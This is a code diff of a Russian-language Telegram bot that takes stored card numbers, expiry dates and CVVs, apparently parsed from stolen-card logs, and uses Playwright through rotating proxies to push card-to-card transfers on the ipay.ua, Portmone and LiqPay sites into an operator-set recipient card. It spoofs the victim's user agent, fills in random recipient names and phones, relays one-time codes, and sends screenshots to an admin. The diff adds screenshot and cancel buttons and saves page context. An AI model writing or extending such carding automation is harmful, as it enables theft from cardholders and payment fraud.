@@ -12,10 +12,12 @@ from aiogram.utils import executor
 from playwright.async_api import async_playwright
 from flask import Flask
 import threading
+import json
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
+SCREENSHOTS_DIR = "/var/data/screenshots"
 
 # ========== FLASK ==========
 app = Flask(__name__)
@@ -29,6 +31,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
 
+# ========== КНОПКИ ==========
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
@@ -37,6 +40,7 @@ def get_main_menu():
 # ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
+    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS sessions (
@@ -48,6 +52,7 @@ def init_db():
         gateway TEXT,
         status TEXT,
         msg_id INTEGER,
+        page_context TEXT,
         timestamp TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
@@ -109,10 +114,25 @@ def get_session(session_id):
 def get_session_by_msg(msg_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
+    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code', 'processing')", (msg_id,))
     row = c.fetchone()
     conn.close()
     return row
+
+def save_page_context(session_id, context_data):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("UPDATE sessions SET page_context = ? WHERE id = ?", (json.dumps(context_data), session_id))
+    conn.commit()
+    conn.close()
+
+def get_page_context(session_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT page_context FROM sessions WHERE id = ?", (session_id,))
+    row = c.fetchone()
+    conn.close()
+    return json.loads(row[0]) if row and row[0] else None
 
 # ========== ПАРСЕР ЛОГА ==========
 def parse_log(text):
@@ -181,6 +201,15 @@ def get_amount_keyboard(session_id):
     amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
     for a in amounts:
         kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
+    kb.add(InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"))
+    return kb
+
+def get_action_keyboard(session_id):
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
+        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
+    )
     return kb
 
 async def get_rotated_proxy():
@@ -197,14 +226,19 @@ async def get_rotated_proxy():
         pass
     return get_setting('proxy')
 
-# ========== ЭМУЛЯЦИЯ ПЛАТЕЖА ==========
-async def emulate_payment(session_id, code=None):
+# ========== ОСНОВНАЯ ЭМУЛЯЦИЯ С СОХРАНЕНИЕМ КОНТЕКСТА ==========
+async def emulate_payment(session_id, code=None, screenshot_only=False):
     session = get_session(session_id)
-    if not session: return "Сессия не найдена"
+    if not session:
+        return "Сессия не найдена"
+    
     card, expiry, cvv, ip, ua, amount, card_to, gateway = session[1], session[2], session[3], session[4], session[5], session[6], session[7], session[8]
-    if not card_to: return "❌ Карта получателя не задана! Используй кнопку 'Карта' в админке"
+    if not card_to: 
+        return "❌ Карта получателя не задана! Используй кнопку 'Карта' в админке"
+    
     expiry = expiry.replace("/", "").strip()
-    if len(expiry) == 4: expiry = expiry[:2] + "/" + expiry[2:]
+    if len(expiry) == 4: 
+        expiry = expiry[:2] + "/" + expiry[2:]
     
     proxy_str = None
     if get_setting('rotation_enabled') == '1':
@@ -225,65 +259,89 @@ async def emulate_payment(session_id, code=None):
     phone = random_phone()
     name = random_name()
 
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True, proxy=proxy_config if proxy_config else None)
-        context = await browser.new_context(user_agent=ua or "Mozilla/5.0 (Linux; Android 10)", locale="uk-UA", timezone_id="Europe/Kyiv")
-        page = await context.new_page()
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True, proxy=proxy_config if proxy_config else None)
+            context = await browser.new_context(
+                user_agent=ua or "Mozilla/5.0 (Linux; Android 10)", 
+                locale="uk-UA", 
+                timezone_id="Europe/Kyiv"
+            )
+            page = await context.new_page()
 
-        # === IPAY ===
-        if gateway == "ipay":
-            await page.goto("https://ipay.ua/card2card")
-            await page.fill('input[name="card_from"]', card)
-            await page.fill('input[name="expiry"]', expiry)
-            await page.fill('input[name="cvv"]', cvv)
-            await page.fill('input[name="card_to"]', card_to)
-            await page.fill('input[name="amount"]', str(amount))
-            await page.fill('input[name="recipient_name"]', name)
-            await page.fill('input[name="recipient_phone"]', phone)
-            await page.click('button[type="submit"]')
-            await asyncio.sleep(3)
+            # === IPAY ===
+            if gateway == "ipay":
+                await page.goto("https://ipay.ua/card2card", timeout=15000)
+                await page.fill('input[name="card_from"]', card, timeout=5000)
+                await page.fill('input[name="expiry"]', expiry, timeout=5000)
+                await page.fill('input[name="cvv"]', cvv, timeout=5000)
+                await page.fill('input[name="card_to"]', card_to, timeout=5000)
+                await page.fill('input[name="amount"]', str(amount), timeout=5000)
+                await page.fill('input[name="recipient_name"]', name, timeout=5000)
+                await page.fill('input[name="recipient_phone"]', phone, timeout=5000)
 
-        # === PORTMONE ===
-        elif gateway == "portmone":
-            await page.goto("https://portmone.com.ua/card2card")
-            await page.fill('input[name="card_from"]', card)
-            await page.fill('input[name="expiry"]', expiry)
-            await page.fill('input[name="cvv"]', cvv)
-            await page.fill('input[name="card_to"]', card_to)
-            await page.fill('input[name="amount"]', str(amount))
-            await page.fill('input[name="name"]', name)
-            await page.click('button[type="submit"]')
-            await asyncio.sleep(3)
+            # === PORTMONE ===
+            elif gateway == "portmone":
+                await page.goto("https://portmone.com.ua/card2card", timeout=15000)
+                await page.fill('input[name="card_from"]', card, timeout=5000)
+                await page.fill('input[name="expiry"]', expiry, timeout=5000)
+                await page.fill('input[name="cvv"]', cvv, timeout=5000)
+                await page.fill('input[name="card_to"]', card_to, timeout=5000)
+                await page.fill('input[name="amount"]', str(amount), timeout=5000)
+                await page.fill('input[name="name"]', name, timeout=5000)
 
-        # === LIQPAY (если добавим) ===
-        elif gateway == "liqpay":
-            await page.goto("https://liqpay.ua/ru/order")
-            await page.fill('input[name="card"]', card)
-            await page.fill('input[name="expiry"]', expiry)
-            await page.fill('input[name="cvv"]', cvv)
-            await page.fill('input[name="amount"]', str(amount))
-            await page.fill('input[name="name"]', name)
-            await page.click('button[type="submit"]')
-            await asyncio.sleep(3)
+            # === LIQPAY ===
+            elif gateway == "liqpay":
+                await page.goto("https://liqpay.ua/ru/order", timeout=15000)
+                await page.fill('input[name="card"]', card, timeout=5000)
+                await page.fill('input[name="expiry"]', expiry, timeout=5000)
+                await page.fill('input[name="cvv"]', cvv, timeout=5000)
+                await page.fill('input[name="amount"]', str(amount), timeout=5000)
+                await page.fill('input[name="name"]', name, timeout=5000)
 
-        screenshot = await page.screenshot(full_page=True)
-        await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"💳 {gateway.upper()} | {amount} UAH")
+            # Сохраняем контекст для скриншотов
+            context_data = {"page": page, "browser": browser, "context": context}
+            save_page_context(session_id, {"browser_id": id(browser)})
 
-        if await page.is_visible('input[name="code"]'):
-            if code:
-                await page.fill('input[name="code"]', code)
-                await page.click('button[type="submit"]')
-                await asyncio.sleep(2)
-                return "✅ Платёж подтверждён!"
-            else:
-                await asyncio.sleep(60)
-                if await page.is_visible('button:has-text("Отправить код")'):
-                    await page.click('button:has-text("Отправить код")')
-                    return "waiting_code"
-        if await page.is_visible('.success'):
-            return "✅ Платёж выполнен успешно!"
-        error_text = await page.text_content('.error')
-        return f"❌ Ошибка: {error_text or 'неизвестная'}"
+            # Если только скриншот
+            if screenshot_only:
+                screenshot = await page.screenshot(full_page=True)
+                await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"📸 Скриншот | {gateway.upper()}")
+                await browser.close()
+                return "screenshot_sent"
+
+            # === НАЖАТИЕ ОПЛАТИТЬ ===
+            await page.click('button[type="submit"]', timeout=5000)
+            await asyncio.sleep(2)
+
+            # === СКРИНШОТ ПОСЛЕ ОТПРАВКИ ===
+            screenshot = await page.screenshot(full_page=True)
+            await bot.send_photo(chat_id=ADMIN_ID, photo=screenshot, caption=f"💳 {gateway.upper()} | {amount} UAH")
+
+            # === ПРОВЕРКА КОДА ===
+            if await page.is_visible('input[name="code"]', timeout=3000):
+                if code:
+                    await page.fill('input[name="code"]', code, timeout=5000)
+                    await page.click('button[type="submit"]', timeout=5000)
+                    await asyncio.sleep(2)
+                    await browser.close()
+                    return "✅ Платёж подтверждён!"
+                else:
+                    await asyncio.sleep(60)
+                    if await page.is_visible('button:has-text("Отправить код")', timeout=3000):
+                        await page.click('button:has-text("Отправить код")', timeout=3000)
+                        return "waiting_code"
+            
+            if await page.is_visible('.success', timeout=3000):
+                await browser.close()
+                return "✅ Платёж выполнен успешно!"
+            
+            error_text = await page.text_content('.error')
+            await browser.close()
+            return f"❌ Ошибка: {error_text or 'неизвестная'}"
+
+    except Exception as e:
+        return f"❌ Ошибка Playwright: {str(e)[:150]}"
 
 # ========== КОМАНДЫ ==========
 @dp.message_handler(commands=['start'])
@@ -387,6 +445,21 @@ async def show_status(callback: types.CallbackQuery):
     )
     await callback.answer()
 
+@dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
+async def handle_screenshot(callback: types.CallbackQuery):
+    session_id = int(callback.data.split("_")[1])
+    await callback.answer("📸 Делаю скриншот...")
+    result = await emulate_payment(session_id, screenshot_only=True)
+    if result != "screenshot_sent":
+        await callback.message.reply(f"❌ Ошибка: {result}")
+
+@dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
+async def handle_cancel(callback: types.CallbackQuery):
+    session_id = int(callback.data.split("_")[1])
+    update_session(session_id, 'status', 'cancelled')
+    await callback.message.reply("❌ Платёж отменён.")
+    await callback.answer()
+
 @dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
 async def handle_amount_callback(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -395,7 +468,7 @@ async def handle_amount_callback(callback: types.CallbackQuery):
     await callback.answer(f"💰 {amount} UAH")
     update_session(session_id, 'amount', amount)
     update_session(session_id, 'status', 'processing')
-    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
+    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
     result = await emulate_payment(session_id)
     if result == "waiting_code":
         update_session(session_id, 'status', 'waiting_code')
